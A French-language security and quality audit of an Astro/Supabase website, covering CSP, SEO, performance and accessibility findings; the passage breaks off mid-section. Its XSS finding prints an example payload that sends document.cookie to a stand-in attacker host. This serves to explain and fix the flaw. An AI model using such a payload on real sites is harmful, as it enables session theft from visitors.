# AUDIT COMPLET — `biscuits-ia`

> **Stack :** Astro 7 (`output: 'server'`) · Vercel · Supabase · React 19 · Tailwind 4
> **Date de l'audit :** 2026-07-08
> **Commit auditée :** `da96ef7` (branche `main`)
> **Périmètre :** 472 fichiers versionnés · 82 routes API · 91 pages · 27 migrations SQL
> **Méthode :** lecture du code source **+ analyse du build réel** (`dist/client/`). Aucune conclusion n'est tirée d'une supposition ; les faits non vérifiables sont listés en fin de document.

---

## Verdict

**Ce projet n'est pas prêt pour des millions de visiteurs. Il n'est pas prêt pour 10 000.**

Il y a un travail réel et visible sur la sécurité — le raisonnement de `src/lib/supabase.ts` sur la token rotation Supabase est meilleur que ce qu'on trouve dans beaucoup de produits financés. Mais il coexiste avec des erreurs structurelles qui annulent une grande partie de cet effort.

Plusieurs mécanismes de sécurité et de SEO sont **écrits, commentés, documentés… et morts au runtime.**

---

## Table des matières

- [🔴 Synthèse exécutive](#-synthèse-exécutive--les-6-choses-qui-cassent-tout)
- [1. Architecture globale](#1-architecture-globale--410)
- [2. Qualité du code](#2-qualité-du-code--410)
- [3. Performance](#3-performance--310)
- [4. SEO](#4-seo--310)
- [5. IA & Robots](#5-ia--robots--410)
- [6. Accessibilité](#6-accessibilité--510)
- [7. Sécurité (OWASP Top 10)](#7-sécurité-owasp-top-10--310)
- [8. Astro / React](#8-astro--react--510)
- [9. UX](#9-ux--610)
- [10. Dépendances](#10-dépendances--510)
- [11. DevOps](#11-devops--110)
- [12. Structure HTML](#12-structure-html--510)
- [13. CSS](#13-css--310)
- [14. JavaScript / TypeScript](#14-javascript--typescript--510)
- [15. API](#15-api--410)
- [16. Base de données](#16-base-de-données--510)
- [17. Comparaison aux standards](#17-comparaison-aux-standards)
- [18. Audit IA](#18-audit-ia--comprendre-ce-projet-en-tant-que-llm--410)
- [📊 Tableau récapitulatif](#-tableau-récapitulatif)
- [🗺️ Roadmap](#️-roadmap)
- [🚀 Top 20 des améliorations](#-les-20-améliorations-à-plus-fort-impact)
- [Angles morts de cet audit](#angles-morts-de-cet-audit)

---

## Légende de criticité

| | Niveau | Signification |
|---|---|---|
| 🔴 | **Critique** | Exploitable, ou casse une fonction majeure. À corriger avant toute autre chose. |
| 🟠 | **Importante** | Dette structurelle ou risque réel à l'échelle. |
| 🟡 | **Moyenne** | Défaut avéré, impact limité aujourd'hui. |
| 🟢 | **Mineure / Bon point** | Cosmétique, ou ce qui est bien fait. |

---

# 🔴 SYNTHÈSE EXÉCUTIVE — les 6 choses qui cassent tout

| # | Problème | Preuve |
|---|----------|--------|
| 1 | **Le CSP n'existe pas sur 90% du site** | `dist/client/index.html` contient un nonce **statique** `zsP9agPmSxxQHYHSI1dlVbQ6` figé au build. Le middleware ne s'exécute jamais sur les pages prerendered. |
| 2 | **`injectNonce()` transforme toute injection HTML en XSS complet** | `src/middleware.ts:230` appose un nonce valide sur *tous* les `<script>` du HTML de sortie. |
| 3 | **XSS stockée confirmée, sur page publique** | `src/pages/trombinoscope.astro:215` — `JSON.stringify()` de données DB dans un `<script>`, sans échappement de `</script>`. |
| 4 | **Le `robots.txt` livré annule toute la config `astro-robots-txt`** | `dist/client/robots.txt` = 4 lignes `Allow: /`. Les ~30 `disallow` d'`astro.config.mjs` sont du code mort. |
| 5 | **Le sitemap servi à Google est un fichier statique périmé de 7 URLs, dont une en 404** | `public/sitemap.xml` écrase la sortie de `@astrojs/sitemap` (24 URLs). |
| 6 | **Le rate-limit est contournable avec un header HTTP** | `src/lib/http.ts:13` fait confiance à `cf-connecting-ip` en priorité 1. Le site n'est pas derrière Cloudflare. |

> ### Le pattern dominant : le « sécurité-théâtre involontaire »
>
> Le code de sécurité est écrit, correctement raisonné, abondamment commenté — mais **l'assemblage final** (build Astro, ordre de résolution `public/` vs intégrations, frontière middleware/prerender) l'invalide.
>
> Un audit qui ne lit que `src/` donnerait **7/10**. Un audit qui lit `dist/` donne **3/10**.
>
> **Corollaire opérationnel :** aucune assertion de sécurité ou de SEO ne doit être validée par relecture du source. Elle doit être validée par une assertion sur **l'artefact produit** (test sur `dist/`, ou `curl -I` sur une preview).

---

# 1. ARCHITECTURE GLOBALE — **4/10**

## 🔴 1.1 — `scripts/` : ~61 scripts de patch jetables versionnés

**Fichiers :** `scripts/patch-h1.cjs` → `patch-h20b.cjs`, `patch-p2-5a..k.cjs`, `patch-vercel-cache1..4.cjs`, `patch-audit-*.cjs`, `patch-vite-fix2.cjs`…

**Comptage :** 61 des 472 fichiers versionnés — **13 % du repo** — sont des scripts de modification ponctuelle du code, exécutés une fois, jamais réutilisables.

**Pourquoi c'est un problème.** Ces fichiers encodent un historique de refactoring qui appartient à `git log`. Ils sont indexés par tout agent IA qui lit le repo, ils polluent les recherches `grep`, et leurs noms (`patch-h9c.cjs`, `patch-h15b.cjs`) ne portent aucune sémantique.

**Impact.** Onboarding humain et IA dégradé, `git ls-files` inexploitable, zéro valeur.

**Correction.**
```bash
git rm -r scripts/patch-*.cjs
# Ne conserver que : cron-status.mjs, generate-pdfs.js, preview-static.mjs, test-auth-flows.sh
```

---

## 🔴 1.2 — Zéro CI/CD, zéro test, zéro config ESLint

```
.github/           → ABSENT
tests              → AUCUN (0 .test.ts, 0 .spec.ts, 0 vitest, 0 playwright)
eslint.config.js   → ABSENT
```

Le script `"lint": "eslint src --ext .ts,.tsx,.astro"` (`package.json`) **échoue systématiquement** : ESLint 10 exige une flat config `eslint.config.js`, absente. Les 5 dépendances ESLint installées ne servent à rien.

**Impact pour un site à fort trafic.** Aucune barrière entre un `git push` et la production. Une XSS, une régression de perf, une fuite de secret passent sans friction.

---

## 🟠 1.3 — Duplication de composants avec collision d'encodage

```
src/components/Confidentialite.astro
src/components/Confidentialité.astro        ← accent dans le nom de fichier
src/pages/legal/confidentialite.astro
src/pages/legal/politique-de-confidentialite.astro
```

Deux composants, deux pages, mêmes responsabilités. Le fichier accentué (stocké en octal `Confidentialit\303\251`) est une **bombe à retardement** sur macOS (NFD vs NFC) et sur les systèmes de fichiers insensibles à la casse.

---

## 🟠 1.4 — Deux lockfiles

`package-lock.json` (300 Ko) **et** `bun.lock` (141 Ko) sont versionnés. Vercel choisira l'un des deux selon détection ; **les installs ne sont pas reproductibles**.

---

## 🟠 1.5 — Duplication massive du guard d'authentification

`src/lib/auth.ts` expose `requireAdmin()`. Pourtant **~40 routes** réimplémentent le check à la main :

```ts
// src/pages/api/admin/benevoles/supprimer.ts:7-14   (et 39 autres fichiers, à l'identique)
const supabase = createSupabaseClient({ request, cookies });
const { data: { user } } = await supabase.auth.getUser();
if (!user) return redirect('/connexion');
const adminDb = createSupabaseAdminClient();
const { data: profile } = await adminDb.from('profiles').select('role').eq('id', user.id).single();
if (profile?.role !== 'admin') return new Response('Accès interdit', { status: 403 });
```

**Impact triple :**

1. **DRY.** 6 lignes × 40 fichiers. Un oubli = une route admin ouverte.
2. **Perf.** `getUser()` fait un appel réseau à Supabase Auth. Le middleware l'a **déjà fait** pour cette requête (`src/middleware.ts:263`). Chaque appel admin = **2 round-trips Auth + 2 requêtes `profiles`**.
3. Ignore `context.locals.supabase` que le middleware a pourtant placé là.

**Correction.**
```ts
// src/pages/api/admin/benevoles/supprimer.ts
import { requireAdmin } from '@/lib/auth';

export const POST: APIRoute = async (ctx) => {
  const auth = await requireAdmin(ctx);
  if (auth instanceof Response) return auth;   // ⚠️ garde-fou obligatoire, cf. §14
  const adminDb = createSupabaseAdminClient();
  // ...
};
```

---

## 🟡 1.6 — Un point dans un nom de route

`src/pages/a-qui.s-adresse.astro` → URL `https://biscuits-ia.com/a-qui.s-adresse`. Voir §4.3 : c'est aussi un bug SEO avec un 404 à la clé.

---

# 2. QUALITÉ DU CODE — **4/10**

## 🔴 2.1 — Le kill-switch analytics est cassé (code mort + override)

```ts
// src/layouts/Layout.astro:54  — s'exécute CÔTÉ SERVEUR
const _analyticsDisabled = import.meta.env.PUBLIC_ANALYTICS_DISABLED === 'true';
if (_analyticsDisabled && typeof window !== "undefined") (window as ...).__ANALYTICS_DISABLED__ = true;
//                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ TOUJOURS FALSE dans un frontmatter Astro
```

```html
<!-- src/layouts/Layout.astro:93 — s'exécute côté client -->
<script is:inline nonce={nonce}>window.__ANALYTICS_DISABLED__ = false;</script>
```

```js
// src/components/BaseHead.astro:137
if (!window.__ANALYTICS_DISABLED__) { /* charge GTM */ }
```

**Le flag ne peut jamais valoir `true`.** La branche `typeof window !== "undefined"` est morte (frontmatter = serveur), et le script inline le remet à `false` de toute façon. **`PUBLIC_ANALYTICS_DISABLED` ne fait rien.**

**Impact RGPD.** En cas d'incident, il n'y a pas de kill-switch. Le commentaire des lignes 88-89 (« expose au client le plus tôt possible pour empêcher le load GTM **même en cas de bug JS en aval** ») décrit exactement l'inverse de ce que le code fait.

**Correction.**
```astro
---
const analyticsDisabled = import.meta.env.PUBLIC_ANALYTICS_DISABLED === 'true';
---
<!-- doit être dans le <head>, AVANT <BaseHead> -->
<script is:inline nonce={nonce} define:vars={{ analyticsDisabled }}>
  window.__ANALYTICS_DISABLED__ = analyticsDisabled;
</script>
```

---

## 🟠 2.2 — Code mort identifié

| Fichier / ligne | Code mort |
|---|---|
| `src/components/BaseHead.astro:46-51` | `window.__PARTYTOWN_CONFIG` — Partytown n'est pas une dépendance |
| `src/components/BaseHead.astro:90` | `<meta http-equiv="X-Content-Type-Options">` — ignoré par les navigateurs (header only) |
| `src/components/BaseHead.astro:104-107` + `112-115` | **Deux `<noscript>` identiques**, dupliqués |
| `src/layouts/Layout.astro` (bloc `<style is:global>`) | `img:not([width]):not([height]) { aspect-ratio: attr(width)/attr(height) }` — `attr()` hors `content` n'est supporté nulle part en stable, **et** le sélecteur cible précisément les images *sans* `width`/`height` |
| `public/sw-register.js` + `src/scripts/sw-register.js` | **Fichiers identiques (247 o)**, aucun des deux n'est chargé (le SW est enregistré inline dans `Layout.astro:104`) |
| `tailwind.config.mjs` (entier) | Config format Tailwind **v3**. Le projet utilise Tailwind **v4** via `@tailwindcss/vite`, qui ignore ce fichier sans directive `@config`. Les couleurs `corps.*` et `darkMode: 'class'` n'existent pas. |
| `astro.config.mjs:20-140` | Toute la config `robotsTxt()` — écrasée par `public/robots.txt` (cf. §4.1) |
| `package.json` | `lucide-astro` (0 usage), `@astrojs/node` (0 usage, adaptateur concurrent de `@astrojs/vercel`) |
| `src/pages/trombinoscope.astro:31` | `photoUrl()` appelée ligne 31, déclarée ligne 38 (sauvée par le hoisting) |

---

## 🟠 2.3 — Fichiers monstres

| Fichier | Lignes |
|---|---|
| `src/pages/dashboard/benevole/project/[id].astro` | **1385** |
| `src/pages/blog/index.astro` | 1010 |
| `src/components/Header.astro` | 994 |
| `src/lib/mail.ts` | 733 |
| `src/pages/blog/[...slug].astro` | 703 |

`project/[id].astro` contient : le rendu SSR, ~700 lignes de JS client inline (chat, commentaires, mentions, watchers, drag & drop kanban, modales), et du CSS. **Cinq modules dans un fichier.** Intestable, et toute modification est un risque.

---

## 🟡 2.4 — `any` : 27 occurrences dans 15 fichiers

Le plus grave : `src/pages/api/formations/helloasso/webhook.ts:31` — `let payload: any;` sur une **entrée réseau non fiable liée à des paiements**. C'est exactement l'endroit où un schéma Zod est obligatoire (et `zod` est déjà installé — utilisé dans 5 fichiers seulement).

---

## 🟡 2.5 — Commentaires qui mentent

- `src/components/SEO/SchemaOrg.astro:2-13` : le même paragraphe est **collé deux fois**, mot pour mot.
- `src/pages/api/appointments/cron/expire.ts:72-74` : « Il n'est PAS utilisé en production » — pour un handler `GET` public bel et bien exporté.
- `src/lib/rateLimit.ts:3-4` : « Vercel serverless will reset on cold starts, **providing a natural baseline** ». Ce n'est pas une baseline, c'est une absence de limite (cf. §7).

---

# 3. PERFORMANCE — **3/10**

## 🔴 3.1 — 94 Ko de CSS **inline** sur chaque page

**Mesure sur le build réel :**
```
dist/client/index.html                = 158 470 octets
  └─ 3 blocs <style> inline           =  94 178 octets   (59 % du HTML)
dist/client/blog/index.html           = 209 260 octets
Total HTML (129 fichiers)             =  16,3 Mo
```

**Cause :** `astro.config.mjs:148` → `inlineStylesheets: 'always'`.

**Pourquoi c'est catastrophique :**
- 94 Ko de CSS **non cachables**, retéléchargés à chaque navigation, sur chaque page.
- Un fichier `.css` externe avec `Cache-Control: immutable` serait téléchargé **une fois**, puis servi depuis le disk cache.
- À 1 M de pages vues/mois : **~94 Go** de bande passante gaspillée, contre ~94 Mo avec un CSS externe.
- Le HTML n'entre plus dans les 14 Ko du premier round-trip TCP → FCP dégradé.

**Correction.**
```js
// astro.config.mjs
build: {
  assets: '_astro',
  inlineStylesheets: 'auto',  // n'inline que les feuilles < 4 Ko
}
```

---

## 🔴 3.2 — Un `@import` Google Fonts **à l'intérieur** du CSS inline

```
style#1 (93 187 octets) commence par :
@import"https://fonts.googleapis.com/css2?family=Inter:wght@400;500;60…
```

Source : `src/styles/global.css:1`.

**Chaîne de requêtes critique produite :**
```
HTML (158 Ko) → parse → @import fonts.googleapis.com/css2 (Inter)
                                 → fonts.gstatic.com/*.woff2
+ EN PARALLÈLE : <link> fonts.googleapis.com/css2 (Zalando Sans)   [BaseHead.astro:102]
                                 → fonts.gstatic.com/*.woff2
```

**Trois problèmes distincts :**

1. Le site charge **deux familles Google Fonts** (Inter *et* Zalando Sans SemiExpanded, cette dernière en variable 200..900 italic + roman). L'une des deux est probablement inutilisée.
2. `@import` dans une feuille inline = requête découverte **après** le parsing de 93 Ko de CSS. C'est le pire cas de waterfall LCP.
3. **RGPD.** `fonts.googleapis.com` transmet l'IP du visiteur à Google **sans consentement**, avant le bandeau cookies. Pour une association qui promeut l'« IA éthique » et publie une charte, c'est une contradiction frontale. (Cf. LG München I, 3 O 17493/20.)

**Correction.**
```css
/* src/styles/global.css — supprimer la ligne 1 */
```
```astro
<!-- self-host : @fontsource-variable/inter, ou woff2 dans /public/fonts -->
<link rel="preload" as="font" type="font/woff2" href="/fonts/inter-var.woff2" crossorigin>
```

*Gain attendu : suppression de 4 requêtes tierces, ~200–400 ms de LCP sur 4G, conformité RGPD.*

---

## 🔴 3.3 — Tailwind est importé **deux fois**

```
src/styles/global.css:2     → @import "tailwindcss";
src/styles/dashboard.css:1  → @import "tailwindcss";
```

**Preuve dans le build.** Le marqueur de preflight `-webkit-text-size-adjust` apparaît **3 fois** dans les `<style>` de `dist/client/index.html`, avec 170 variables `--tw-*`.

**Conséquence.** Le preflight + les utilitaires Tailwind sont sérialisés deux fois, et **`dashboard.css` (18 Ko de CSS d'administration) est inliné dans la page d'accueil publique.** Un visiteur anonyme télécharge le CSS du kanban bénévole.

**Correction.** `dashboard.css` ne doit pas réimporter Tailwind. Un seul `@import "tailwindcss"`, dans `global.css`.

---

## 🔴 3.4 — 185 Ko de React pour une bannière cookies

```
dist/client/_astro/client.DcCF1Dqr.js        185 260 o   ← runtime React
dist/client/_astro/react.BP4L4ZfO.js           7 588 o
dist/client/_astro/CookieConsent.CP6J11wc.js   5 988 o
```

**Cause :** `src/layouts/Layout.astro:110` → `<CookieConsent client:visible />`, dans le layout **global**. React est donc hydraté sur **toutes** les pages publiques, y compris les 129 pages statiques du blog.

**Impact.** ~60 Ko gzip de JS pour un composant de 330 lignes qui gère 4 cases à cocher et `localStorage`. TBT et INP dégradés sur mobile bas de gamme, sur 100 % du trafic.

**Correction.** Réécrire `CookieConsent` en vanilla dans une balise `<script>` Astro (~2 Ko). Un bandeau cookies est un cas d'école de « pas besoin de framework ».

---

## 🟠 3.5 — Le middleware tue le streaming HTML

```ts
// src/middleware.ts:289
const html = injectNonce(await response.text(), nonce);
```

`await response.text()` **bufferise l'intégralité de la réponse** avant de l'envoyer. Astro streame le HTML par défaut : le `<head>` part immédiatement, le navigateur préconnecte et précharge pendant que le serveur calcule le reste.

Ici, **TTFB = temps de rendu complet**. Sur les pages SSR lourdes (`/trombinoscope`, dashboards), c'est plusieurs centaines de ms perdues, systématiquement.

---

## 🟠 3.6 — Un logo de 158 Ko, en 4 variantes

```
dist/client/_astro/logo.gzSZM-kU_Eo7SQ.webp    158 018 o
dist/client/_astro/logo.gzSZM-kU_Z18dmu.webp   147 874 o
dist/client/_astro/logo.gzSZM-kU_Z2wV7ql.webp   95 554 o
dist/client/_astro/logo.gzSZM-kU_2uBABn.webp    35 754 o
src/assets/logo.png                            ≈ 6 Mo
```

Un logo doit peser < 10 Ko. En SVG, < 3 Ko. **436 Ko de variantes WebP pour un logo** est indéfendable.

---

## 🟠 3.7 — `handleSessionGuard` s'exécute sur toutes les pages non-publiques

`src/middleware.ts:44-48` — `isPublicPath()` ne couvre que `/connexion`, `/inscription`, `/auth/*`, `/_astro/`, `/favicon`.

Donc pour tout utilisateur connecté visitant `/`, `/blog`, `/faq`…, le middleware exécute :
1. `supabase.auth.getUser()` → **appel réseau** vers Supabase Auth
2. `readLastLogoutAtMs()` → requête `profiles` (mitigée par un cache 30 s, mais cf. §7.6)

Sur les pages **prerendered** le middleware ne tourne pas (heureusement), mais sur toute route SSR c'est 1 à 2 round-trips ajoutés au TTFB, pour rien.

---

## 🟢 3.8 — Ce qui est bien fait

- `esbuild` minify + `cssCodeSplit` + `treeShaking` + `reportCompressedSize: false` : configuration Vite propre.
- `Cache-Control: immutable` sur `/_astro/*` : correct.
- `s-maxage` + `stale-while-revalidate` sur `/blog/*` : bon réflexe.
- 49 pages en `prerender = true` : la bonne décision.
- Brotli / Gzip : géré automatiquement par Vercel Edge. Rien à faire.

---

# 4. SEO — **3/10**

## 🔴 4.1 — Le `robots.txt` en production annule toute la configuration

**Config source** (`astro.config.mjs:20-140`) : 3 policies, ~30 `disallow`, `crawlDelay`, whitelist explicite de 17 crawlers LLM. ~120 lignes soigneusement commentées.

**Fichier réellement livré** (`dist/client/robots.txt`) :
```
User-agent: *
Allow: /

Sitemap: https://biscuits-ia.com/sitemap.xml
```

**Cause.** `public/robots.txt` existe. Astro copie `public/` vers `dist/client/`, et le fichier statique gagne. Les 120 lignes de config sont **du code mort**.

**Conséquences :**
- `/dashboard`, `/api`, `/admin`, `/connexion`, `/verifier-code-inscription` sont **crawlables et indexables**.
- La politique LLM (GPTBot, ClaudeBot, PerplexityBot…) n'existe pas.
- Aucun `crawlDelay`.

**Correction.** `git rm public/robots.txt`, puis **vérifier `dist/client/robots.txt` après build**.

---

## 🔴 4.2 — Le sitemap servi à Google est un fichier statique périmé

```
dist/client/sitemap.xml        →   7 URLs   (public/sitemap.xml, écrit à la main, lastmod 2026-07-05)
dist/client/sitemap-index.xml  →   pointe vers sitemap-0.xml
dist/client/sitemap-0.xml      →  24 URLs   (généré par @astrojs/sitemap)
```

`robots.txt` déclare `Sitemap: /sitemap.xml` → **Google reçoit 7 URLs sur 24.** Les 17 autres, dont tout `/blog/*` (26 articles MDX), ne sont pas déclarées.

**Correction.** `git rm public/sitemap.xml`, et pointer `robots.txt` sur `/sitemap-index.xml`.

---

## 🔴 4.3 — Une URL avec un point + un 404 dans le sitemap

```
Route réelle       : /a-qui.s-adresse        (fichier : src/pages/a-qui.s-adresse.astro)
public/sitemap.xml : /a-qui-s-adresse        ← 404
sitemap-0.xml      : /a-qui.s-adresse/
Lien interne       : href="/a-qui.s-adresse"
```

Le sitemap servi à Google contient **une URL 404 sur 7**. Et le point dans l'URL est un choix douteux (certains parsers le traitent comme une extension de fichier).

**Correction.** Renommer en `src/pages/a-qui-s-adresse.astro`, ajouter un 301 depuis l'ancienne URL.

---

## 🔴 4.4 — Le sitemap contient des URLs redirigées en 301

`vercel.json` redirige `/logiciels` → `/piliers/logiciels` et `/anti-pepins` → `/piliers/anti-pepins`, **alors que `src/pages/logiciels.astro` et `src/pages/anti-pepins.astro` existent** (586 lignes pour le second).

Résultat :
- Deux pages complètes, buildées, **inatteignables** (le 301 les masque).
- `sitemap-0.xml` les déclare quand même → Google crawle 3 URLs redirigées.
- `vercel.json` définit un `Cache-Control` pour `/pourquoi-biscuits-ia`… qui est lui aussi un 301.

**Décidez :** soit les pages, soit les redirects. Pas les deux.

---

## 🟠 4.5 — Hiérarchie de titres cassée sur la page d'accueil

Ordre des balises dans `dist/client/index.html` :
```
h3 h3 h3 h3 h3  h1  h2 h3 h3 h3 h3 h3 h2 h2 h2 h2 h3 h3 h3 h2 ...
```

Cinq `<h3>` **avant** le `<h1>`. Origine : le méga-menu de `src/components/Header.astro:53,82,107,128,148`. Idem `Footer.astro:9,16,29,43` (des `<h3>` sans `<h2>` ancêtre).

Violation WCAG 1.3.1 + signal de structure dégradé pour Google et les LLM.

**Correction.** Dans un `<nav>`, utiliser `<p class="nav-group-title">` ou `<span>` + `aria-labelledby`, pas des headings.

---

## 🟠 4.6 — Pages sans `<h1>`

Vérifié sur le build :
```
/blog                     h1 = 0
/projects-collaboratif    h1 = 0
/rejoignez-nous           h1 = 0
```

---

## 🟡 4.7 — Divers

- `<link rel="sitemap" href="/sitemap.xml">` (`BaseHead.astro:87`) pointe sur le sitemap périmé.
- `HSTS` sans `preload` (`vercel.json:19`).
- Pas de balise `hreflang` malgré `i18n` configuré dans `@astrojs/sitemap`.
- GTM ID `GTM-W2273TRX` en dur (`BaseHead.astro:146`) alors que `.env.example` prévoit `GTM_ID`.

---

## 🟢 4.8 — Ce qui est bien fait

Canonical systématique, OpenGraph + Twitter Cards, JSON-LD riche (Organization, Article, FAQPage, HowTo, Course, Speakable), `Breadcrumb` avec `BreadcrumbList`, RSS avec `sanitize-html`, IndexNow.

**Le travail SEO on-page est de bon niveau. C'est la plomberie de crawl qui est cassée.**

---

# 5. IA & ROBOTS — **4/10**

> Voici exactement pourquoi une IA explore mal ce site.

## 🔴 5.1 — Aucune politique LLM n'atteint les crawlers

Vous avez écrit 60 lignes de policy pour GPTBot, ClaudeBot, PerplexityBot, Google-Extended, CCBot, Bytespider, OAI-SearchBot, DuckAssistBot… (`astro.config.mjs:82-140`).

**Aucun crawler ne la verra.** Voir §4.1. Ils lisent `Allow: /` et rien d'autre.

---

## 🔴 5.2 — `llms.txt` n'est découvrable par personne

```
grep -rn "llms" public/robots.txt src/components/BaseHead.astro src/layouts/Layout.astro
→ NOT REFERENCED ANYWHERE
```

- Pas de mention dans `robots.txt`
- Pas de `<link rel="alternate" type="text/markdown" href="/llms.txt">`
- Pas de header `Link:`

Un LLM crawler ne devine pas `/llms.txt`. Certains le testent, la plupart non.

**Correction.**
```
# public/robots.txt (ou config astro-robots-txt, une fois public/robots.txt supprimé)
Sitemap: https://biscuits-ia.com/sitemap-index.xml

# LLM-friendly documentation
# https://biscuits-ia.com/llms.txt
# https://biscuits-ia.com/llms-full.txt
```
```astro
<!-- BaseHead.astro -->
<link rel="alternate" type="text/markdown" href="/llms.txt" title="llms.txt">
```

---

## 🟠 5.3 — `llms-full.txt` est un endpoint SSR qui tape la DB en `service_role`

```ts
// src/pages/llms-full.txt.ts:15-16, 20
import { fetchRoleSecure } from '@/lib/auth';
import { createSupabaseAdminClient } from '@/lib/supabase';
export const prerender = false;
```

Chaque crawl de ce fichier réveille une lambda et ouvre une connexion Supabase avec la clé `service_role`. Pour un contenu **statique par nature** (une description markdown du site). À l'échelle de plusieurs crawlers LLM × plusieurs passages/jour, c'est du coût pur et une surface d'attaque inutile.

**Correction.** `prerender = true` (le contenu blog vient de `astro:content`, disponible au build). Si des données dynamiques sont nécessaires : ISR avec `s-maxage=86400`.

---

## 🟠 5.4 — Le `<head>` est pollué

Pour un LLM qui lit le HTML brut, `dist/client/index.html` c'est : 94 Ko de CSS Tailwind minifié + 3 blocs JSON-LD, **puis** le contenu. Le ratio signal/bruit est catastrophique. Corriger §3.1 corrige aussi ça.

---

## 🟠 5.5 — `<h3>` avant `<h1>`

Un LLM qui reconstruit la structure du document à partir des headings obtient un arbre invalide. Les 5 `<h3>` de navigation sont interprétés comme du contenu de premier plan. Cf. §4.5.

---

## 🟢 5.6 — Ce qui est bien fait

- **SSR / SSG complet** : aucun contenu injecté par JS. Un crawler sans JS voit 100 % du contenu. ✅
- **Pas de Shadow DOM, pas de client-side routing.** ✅
- Une seule island React (`CookieConsent`), non-essentielle au contenu. ✅
- JSON-LD abondant et bien typé. ✅
- `llms.txt` conforme à la spec [llmstxt.org](https://llmstxt.org/) (contenu, pas distribution). ✅

> **Verdict IA.** La *page* est parfaitement crawlable. C'est la *découverte* (robots, sitemap, llms.txt) qui est cassée. **Vous avez fait le travail difficile et raté le travail facile.**

---

# 6. ACCESSIBILITÉ — **5/10**

| Gravité | Problème | Fichier |
|---|---|---|
| 🔴 | Ordre des titres : `h3×5` avant `h1` — WCAG 1.3.1 (A) | `Header.astro:53,82,107,128,148` |
| 🔴 | 3 pages sans `<h1>` — WCAG 2.4.6 | `/blog`, `/projects-collaboratif`, `/rejoignez-nous` |
| 🟠 | Le chat/kanban est piloté par `innerHTML` + `addEventListener` sur des nœuds recréés → **focus perdu à chaque refresh**, pas de `role="log"` / `aria-live` | `project/[id].astro:1301,1321` |
| 🟠 | Dropdown de mentions `@` : `<li>` sans `role="option"`, pas d'`aria-activedescendant`, navigation clavier absente (`mousedown` uniquement) — WCAG 2.1.1 (A) | `project/[id].astro:1171-1188` |
| 🟠 | `Footer.astro` : **0 attribut `aria-*`** sur toute la navigation de pied de page | `Footer.astro` |
| 🟡 | `<main role="main">` — attribut redondant sur un élément qui porte déjà ce rôle implicite | `Layout.astro:100` |
| 🟡 | Notifications injectées en `innerHTML` sans `aria-live` : un lecteur d'écran ne les annonce jamais | `DashboardLayout.astro:337` |
| 🟢 | `lang="fr-FR"`, `dir="ltr"`, skip-link, `:focus-visible` 3px, `prefers-reduced-motion` | corrects |
| 🟢 | **0 `<img>` sans `alt`** sur 100 % des fichiers `.astro` | correct |
| ❓ | **Contrastes non vérifiables statiquement.** `theme.css` utilise des variables CSS ; il faut un run axe-core. | à faire |

**Correction du dropdown de mentions :**
```html
<ul id="mention-dropdown" role="listbox" aria-label="Suggestions de mention">
  <li role="option" id="mention-0" aria-selected="false" tabindex="-1">…</li>
</ul>
<textarea aria-controls="mention-dropdown" aria-activedescendant="mention-0" aria-expanded="true">
```
+ gestion `ArrowUp` / `ArrowDown` / `Enter` / `Escape`.

---

# 7. SÉCURITÉ (OWASP Top 10) — **3/10**

## 🔴 CRITIQUE 1 — XSS stockée sur page publique via JSON-LD

**Fichier :** `src/pages/trombinoscope.astro:215`
**OWASP :** A03:2021 — Injection

```astro
---
const { data: membres } = await createSupabaseAdminClient()
  .from('benevoles')
  .select('id, prenom, nom, role, competences, photo_url, bio, lien');  // ← données DB

const trombinoscopeSchema = {
  itemListElement: (membres ?? []).map((m, i) => ({
    item: { '@type': 'Person', name: m.prenom + ' ' + m.nom, url: m.lien, knowsAbout: m.competences }
  })),
};
---
<script type="application/ld+json" is:inline set:html={JSON.stringify(trombinoscopeSchema)} />
```

**`JSON.stringify()` n'échappe pas `</script>`.** C'est le bug le plus classique du JSON-LD, et il est ici.

**Exploit.** Un admin — ou toute écriture sur la table `benevoles`, alimentée par `POST /api/admin/benevoles/create` — définit :
```
nom = </script><script>fetch('https://evil.tld/?c='+document.cookie)</script>
```
→ Le HTML rendu contient un `<script>` attaquant sur une **page publique**.

**Aggravation.** `src/middleware.ts:230` lui appose ensuite un **nonce CSP valide** (cf. CRITIQUE 2). Le CSP ne bloque rien.

**Correction.**
```astro
---
function jsonLd(o: unknown): string {
  return JSON.stringify(o)
    .replaceAll('<', '\\u003c')
    .replaceAll('>', '\\u003e')
    .replaceAll('&', '\\u0026')
    // U+2028 / U+2029 : valides en JSON, mais ILLEGAUX dans un litteral JS
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}
---
<script type="application/ld+json" is:inline set:html={jsonLd(trombinoscopeSchema)} />
```

**À appliquer sur les 8 occurrences :**
`BaseHead.astro:67` · `Breadcrumb.astro:85` · `Citation.astro:82` · `SEO/HowTo.astro:50` · `SEO/SchemaOrg.astro:474` · `SEO/SchemaOrg.astro:478` · `auteur/[slug].astro:166` · `trombinoscope.astro:215`

---

## 🔴 CRITIQUE 2 — `injectNonce()` : un CSP qui autorise l'attaquant

**Fichier :** `src/middleware.ts:230-235`
**OWASP :** A05:2021 — Security Misconfiguration

```ts
function injectNonce(html: string, nonce: string): string {
  return html.replaceAll(/<script\b([^>]*)>/g, (match, attrs: string) => {
    if (/\bnonce\s*=/.test(attrs)) return match;
    return `<script${attrs} nonce="${nonce}">`;   // ← nonce sur TOUT <script>
  });
}
```

Le principe d'un nonce CSP est que **seuls les scripts que le serveur a écrits** le portent. Ici, le middleware l'ajoute par regex à **tous** les `<script>` du HTML final — y compris ceux qu'un attaquant vient d'injecter via la faille précédente.

**Cela convertit toute injection HTML en XSS avec exécution garantie.** Le CSP passe de « défense en profondeur » à « aucun effet ».

**Bug secondaire.** `script-src` déclare `'strict-dynamic'` (ligne 168) mais `script-src-elem` est aussi défini (ligne 169) **sans** `'strict-dynamic'`. Or `script-src-elem` prime sur `script-src` pour les éléments `<script>`. Le `'strict-dynamic'` est donc **inerte**, et `script-src-elem` autorise `https://*.vercel.app` — un wildcard sur un domaine où n'importe qui peut déployer.

**Correction.**
```astro
<!-- Passer le nonce explicitement dans chaque <script> Astro -->
<script is:inline nonce={Astro.locals.nonce}>…</script>
```
```ts
// Supprimer injectNonce() ENTIÈREMENT.
// Astro propage déjà locals.nonce ; les scripts bundlés sont chargés
// dynamiquement par le loader, couvert par 'strict-dynamic'.
```
Et retirer `script-src-elem` pour laisser `script-src` + `'strict-dynamic'` faire son travail.

---

## 🔴 CRITIQUE 3 — Le CSP ne s'applique pas au site public

**Preuve :**
```bash
$ grep -o 'nonce="[^"]*"' dist/client/index.html | sort -u
